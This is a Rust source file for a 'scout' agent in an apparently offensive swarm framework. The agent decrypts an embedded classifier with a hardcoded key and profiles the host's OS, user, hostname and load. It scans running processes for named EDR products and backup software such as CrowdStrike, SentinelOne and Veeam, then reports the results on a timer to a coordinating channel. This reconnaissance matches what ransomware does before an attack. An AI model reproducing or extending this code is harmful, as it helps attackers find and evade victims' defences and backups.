use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Value};
use std::time::Duration;
use tokio::time;
use tracing::{info, warn};

const SCOUT_MODEL_ENC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/scout_model.enc"));

fn load_scout_model() -> Vec<u8> {
    let seed = b"SWARM_SCOUT_ONNX_V1_X7k2Mp9Q_n3R4sT8v";
    hive_base::decrypt_model(SCOUT_MODEL_ENC, seed.as_slice())
        .expect("Failed to decrypt scout model")
}

fn onnx_classify_inner(_onnx_bytes: &[u8], features: &[f32; 14]) -> Option<i64> {
    // Pure Rust RandomForest evaluator — no ONNX Runtime needed
    let rf = hive_base::ml::RandomForest::from_binary(_onnx_bytes)?;
    let class = rf.predict(features)?;
    Some(class as i64)
}

fn onnx_classify(onnx_bytes: &[u8], features: &[f32; 14]) -> Option<i64> {
    let bytes = onnx_bytes.to_vec();
    let feats = *features;
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(move || {
        onnx_classify_inner(&bytes, &feats)
    })).unwrap_or_else(|_| {
        tracing::warn!("Forest classifier failed, falling back to heuristics");
        None
    })
}

fn collect_classifier_features() -> [f32; 14] {
    let process_count = get_process_count() as f32;
    let proc_list = get_running_processes();
    let has_edr = edr_process_found(&proc_list) as u8 as f32;
    let has_backup = backup_process_found(&proc_list) as u8 as f32;

    [
        process_count,
        process_count * 0.7,
        estimate_cpu_usage(),
        estimate_memory_usage(),
        1000.0,
        has_edr,
        has_backup,
        0.0, 0.0, 1.0, 1.0, 1.0, 1.0, 0.0,
    ]
}

fn estimate_cpu_usage() -> f32 {
    if let Ok(stat) = std::fs::read_to_string("/proc/stat") {
        let line = stat.lines().next().unwrap_or("");
        let parts: Vec<f32> = line.split_whitespace().skip(1)
            .filter_map(|v| v.parse().ok()).collect();
        if parts.len() >= 4 {
            let idle = parts[3];
            let total: f32 = parts.iter().sum();
            if total > 0.0 { return 100.0 - (idle / total * 100.0); }
        }
    }
    25.0
}

fn estimate_memory_usage() -> f32 {
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        let mut total: u64 = 0;
        let mut avail: u64 = 0;
        for line in meminfo.lines() {
            if line.starts_with("MemTotal:") {
                total = line.split_whitespace().nth(1).and_then(|v| v.parse().ok()).unwrap_or(0);
            }
            if line.starts_with("MemAvailable:") {
                avail = line.split_whitespace().nth(1).and_then(|v| v.parse().ok()).unwrap_or(0);
            }
        }
        if total > 0 { return ((total - avail) as f32 / total as f32) * 100.0; }
    }
    50.0
}

fn edr_process_found(proc_list: &[String]) -> bool {
    let names = ["csfalcon", "csagent", "msmpeng", "sentinelone", "carbonblack", "cylancesvc", "symantec", "mcafee"];
    proc_list.iter().any(|p| names.iter().any(|n| p.to_lowercase().contains(n)))
}

fn backup_process_found(proc_list: &[String]) -> bool {
    let names = ["veeam", "backup_exec", "commvault", "netbackup", "backup_agent"];
    proc_list.iter().any(|p| names.iter().any(|n| p.to_lowercase().contains(n)))
}

struct ScoutAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    onnx_model: Vec<u8>,
    scan_interval: Duration,
    heartbeat_interval: Duration,
}

impl ScoutAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        let comms = HiveChamber::connect(&identity, Role::Worker).await
            .expect("Failed to connect to colmena arena");

        let onnx_model = load_scout_model();
        let cfg = hive_base::config::HiveConfig::load();
        info!("Worker: Forest model loaded ({} bytes) | scan:{}s heartbeat:{}s",
            onnx_model.len(), cfg.timing.scan_interval_secs, cfg.timing.heartbeat_interval_secs);

        Self {
            comms, identity, consensus: ConsensusEngine::new(cfg.consensus.threshold),
            onnx_model,
            scan_interval: Duration::from_secs(cfg.timing.scan_interval_secs),
            heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
        }
    }

    async fn collect_system_profile(&self) -> Vec<(String, Value, f32)> {
        let mut beliefs = Vec::new();

        beliefs.push(("os_type".into(), Value::String(std::env::consts::OS.into()), 1.0));
        beliefs.push(("arch".into(), Value::String(std::env::consts::ARCH.into()), 1.0));
        let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".into());
        beliefs.push(("hostname".into(), Value::String(hostname), 1.0));
        let user = std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_else(|_| "unknown".into());
        beliefs.push(("user".into(), Value::String(user), 0.9));

        let features = collect_classifier_features();
        let classification = onnx_classify(&self.onnx_model, &features);
        let (is_edr, is_backup, ml_conf) = match classification {
            Some(2) => (true, false, 0.95),
            Some(1) => (false, true, 0.90),
            Some(0) => (false, false, 0.92),
            _ => {
                let pl = get_running_processes();
                (edr_process_found(&pl), backup_process_found(&pl), 0.70)
            }
        };
        info!("Forest classifier: class={:?} -> edr={} backup={}", classification, is_edr, is_backup);

        beliefs.push(("edr_present".into(), Value::Bool(is_edr), ml_conf));
        beliefs.push(("backup_present".into(), Value::Bool(is_backup), 0.90));
        beliefs.push(("network_interfaces".into(), Value::Int(get_interface_count() as i64), 0.95));
        beliefs.push(("process_count".into(), Value::Int(get_process_count() as i64), 0.9));

        beliefs
    }

    async fn publish_beliefs(&self, beliefs: &[(String, Value, f32)]) {
        for (asset, value, confidence) in beliefs {
            let msg = Message::belief(self.identity.id(), Role::Worker, asset.clone(), value.clone(), *confidence);
            info!("Belief: {} = {:?} ({})", asset, value, confidence);
            self.comms.publish(msg).await;
        }
    }

    async fn send_heartbeat(&self) { self.comms.send_heartbeat().await; }

    async fn process_incoming(&mut self) {
        for msg in self.comms.read_new().await {
            self.consensus.process_message(&msg);
            match &msg.payload {
                Payload::Request { service, .. } if service == "scan" => {
                    info!("Received scan request");
                    let beliefs = self.collect_system_profile().await;
                    self.publish_beliefs(&beliefs).await;
                }
                Payload::Belief { asset, value, confidence } => {
                    info!("Belief from {}: {} = {:?} ({})", msg.agent_role, asset, value, confidence);
                }
                Payload::StatusEvent { event_type, subject_id, .. } if event_type == "agent_dead" => {
                    warn!("Agent {} reported DEAD", subject_id);
                }
                _ => {}
            }
        }
    }

    async fn check_dead_agents(&self) {
        for agent_id in self.comms.check_dead_agents(30).await {
            let msg = Message::status_event(self.identity.id(), Role::Worker, "agent_dead", agent_id, Role::Worker, "no heartbeat");
            self.comms.publish(msg).await;
        }
    }

    async fn run(&mut self) {
        info!("Hive Worker starting | ID: {} | Forest model active", self.identity.id());
        self.send_heartbeat().await;

        let mut hb = time::interval(self.heartbeat_interval);
        let mut scan = time::interval(self.scan_interval);

        loop {
            tokio::select! {
                _ = hb.tick() => { self.send_heartbeat().await; self.check_dead_agents().await; }
                _ = scan.tick() => {
                    let beliefs = self.collect_system_profile().await;
                    self.publish_beliefs(&beliefs).await;
                }
                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
            }
        }
    }
}

fn get_running_processes() -> Vec<String> {
    if let Ok(entries) = std::fs::read_dir("/proc") {
        entries.filter_map(|e| e.ok())
            .filter(|e| e.path().join("comm").exists())
            .filter_map(|e| std::fs::read_to_string(e.path().join("comm")).ok())
            .map(|s| s.trim().to_string()).collect()
    } else { Vec::new() }
}

fn get_interface_count() -> usize {
    std::fs::read_dir("/sys/class/net").map(|e| e.count()).unwrap_or(0)
}

fn get_process_count() -> usize {
    std::fs::read_dir("/proc").map(|e| e.filter(|x| x.as_ref().ok().map_or(false, |f| f.path().join("comm").exists())).count()).unwrap_or(0)
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("worker");
    info!("Initializing Hive Worker...");
    ScoutAgent::new().await.run().await;
}
